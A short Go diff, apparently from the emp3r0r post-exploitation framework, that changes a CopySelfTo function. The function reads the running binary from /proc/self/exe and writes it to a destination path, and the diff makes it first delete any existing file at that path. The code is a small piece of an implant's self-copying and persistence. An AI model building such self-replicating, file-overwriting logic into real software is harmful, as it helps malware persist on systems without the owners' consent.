@@ -6,9 +6,11 @@ import (
 	"fmt"
 	"io/ioutil"
 	"log"
+	"os"
 	"os/exec"
 
 	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
+	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	golpe "github.com/jm33-m0/go-lpe"
 )
 
@@ -17,6 +19,11 @@ func CopySelfTo(dest_path string) (err error) {
 	elf_data, err := ioutil.ReadFile("/proc/self/exe")
 	if err != nil {
 		return fmt.Errorf("Read self exe: %v", err)
+	}
+
+	// overwrite
+	if util.IsFileExist(dest_path) {
+		os.RemoveAll(dest_path)
 	}
 
 	return ioutil.WriteFile(dest_path, elf_data, 0755)
